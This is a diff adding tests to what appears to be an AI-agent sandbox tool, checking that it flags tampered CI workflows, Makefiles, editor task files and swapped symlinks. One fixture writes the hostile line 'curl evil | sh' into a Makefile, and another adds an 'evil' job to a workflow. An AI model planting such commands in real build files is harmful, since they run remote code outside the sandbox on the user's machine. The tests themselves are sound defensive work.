@@ -14,9 +14,11 @@ from abox.manifest import (
     CustomServers,
     GlobalConfig,
     Manifest,
+    MountsConfig,
     PermissionMode,
     SecretsConfig,
     merged_egress,
+    merged_watch,
 )
 
 
@@ -224,6 +226,114 @@ def test_git_check_skips_a_non_repo(tmp_path: Path) -> None:
     plain = tmp_path / "plain"
     plain.mkdir()
     assert doctor.check_git_tamper(plain).status is doctor.Status.skip
+
+
+def test_git_and_watch_snapshots_share_a_file_without_clobbering(
+    manifest, config, workspace: Path
+) -> None:
+    """Both live in git-snapshot.json; writing one must not drop the other."""
+    doctor.check_git_tamper(workspace)
+    doctor.check_exec_surface(manifest, config, workspace)
+    stored = json.loads(doctor._git_state_path(workspace).read_text())
+    assert "keys" in stored and "watch" in stored
+    doctor.check_git_tamper(workspace, update=True)
+    assert "watch" in json.loads(doctor._git_state_path(workspace).read_text())
+
+
+def test_exec_surface_baselines_then_flags_a_poisoned_workflow(
+    manifest, config, workspace: Path
+) -> None:
+    flows = workspace / ".github" / "workflows"
+    flows.mkdir(parents=True)
+    (flows / "ci.yml").write_text("on: push\njobs: {}\n")
+
+    first = doctor.check_exec_surface(manifest, config, workspace)
+    assert first.status is doctor.Status.ok
+    assert "baseline recorded" in first.detail
+
+    (flows / "ci.yml").write_text("on: push\njobs: {evil: {runs-on: ubuntu}}\n")
+    second = doctor.check_exec_surface(manifest, config, workspace)
+    assert second.status is doctor.Status.warn
+    assert ".github/workflows/ci.yml" in second.detail
+    assert second.data["changed"] == [".github/workflows/ci.yml"]
+    assert "execute outside the sandbox" in second.hint
+
+
+def test_exec_surface_notices_a_workflow_added_after_the_baseline(
+    manifest, config, workspace: Path
+) -> None:
+    (workspace / ".github" / "workflows").mkdir(parents=True)
+    doctor.check_exec_surface(manifest, config, workspace)
+    (workspace / ".github" / "workflows" / "release.yml").write_text("on: push\n")
+    check = doctor.check_exec_surface(manifest, config, workspace)
+    assert check.data["added"] == [".github/workflows/release.yml"]
+
+
+def test_exec_surface_covers_the_recommended_default_set(
+    manifest, config, workspace: Path
+) -> None:
+    for name in ("Makefile", "justfile", "package.json", ".pre-commit-config.yaml"):
+        (workspace / name).write_text("original\n")
+    (workspace / "demo.code-workspace").write_text("{}\n")
+    (workspace / ".vscode").mkdir()
+    (workspace / ".vscode" / "tasks.json").write_text("{}\n")
+
+    doctor.check_exec_surface(manifest, config, workspace)
+    (workspace / "Makefile").write_text("all:\n\tcurl evil | sh\n")
+    (workspace / "demo.code-workspace").write_text('{"x":1}\n')
+    check = doctor.check_exec_surface(manifest, config, workspace)
+    assert check.data["changed"] == ["Makefile", "demo.code-workspace"]
+
+
+def test_exec_surface_can_be_re_baselined(manifest, config, workspace: Path) -> None:
+    (workspace / "Makefile").write_text("all:\n")
+    doctor.check_exec_surface(manifest, config, workspace)
+    (workspace / "Makefile").write_text("all:\n\tevil\n")
+    assert doctor.check_exec_surface(manifest, config, workspace).status is doctor.Status.warn
+    doctor.check_exec_surface(manifest, config, workspace, update=True)
+    assert doctor.check_exec_surface(manifest, config, workspace).status is doctor.Status.ok
+
+
+def test_exec_surface_records_a_symlink_by_its_target_not_its_contents(
+    manifest, config, workspace: Path
+) -> None:
+    """Following the link would hide exactly the swap this exists to catch."""
+    (workspace / "real-makefile").write_text("all:\n")
+    (workspace / "other").write_text("all:\n")
+    (workspace / "Makefile").symlink_to(workspace / "real-makefile")
+    doctor.check_exec_surface(manifest, config, workspace)
+
+    (workspace / "Makefile").unlink()
+    (workspace / "Makefile").symlink_to(workspace / "other")  # identical contents
+    check = doctor.check_exec_surface(manifest, config, workspace)
+    assert check.data["changed"] == ["Makefile"]
+
+
+def test_exec_surface_reports_rather_than_silently_capping(
+    manifest, config, workspace: Path, monkeypatch
+) -> None:
+    monkeypatch.setattr(doctor, "WATCH_FILE_CAP", 3)
+    flows = workspace / ".github" / "workflows"
+    flows.mkdir(parents=True)
+    for i in range(10):
+        (flows / f"w{i}.yml").write_text(f"on: push # {i}\n")
+    check = doctor.check_exec_surface(manifest, config, workspace)
+    assert ".github/workflows" in check.data["capped"]
+    assert "exceeded 3 files" in check.detail
+
+
+def test_masked_paths_are_not_also_watched(manifest, config) -> None:
+    """A path the agent cannot reach cannot be tampered with by the agent."""
+    config.defaults.watch = ["Makefile", "package.json"]
+    manifest.mounts.mask = ["Makefile"]
+    assert merged_watch(manifest, config) == ["package.json"]
+
+
+def test_watch_globs_must_stay_inside_the_workspace() -> None:
+    with pytest.raises(ValueError, match="workspace-relative"):
+        MountsConfig(watch=["/etc/crontab"])
+    with pytest.raises(ValueError, match="escape the workspace"):
+        MountsConfig(watch=["../elsewhere"])
 
 
 def test_op_is_skipped_when_nothing_needs_it(runner) -> None:
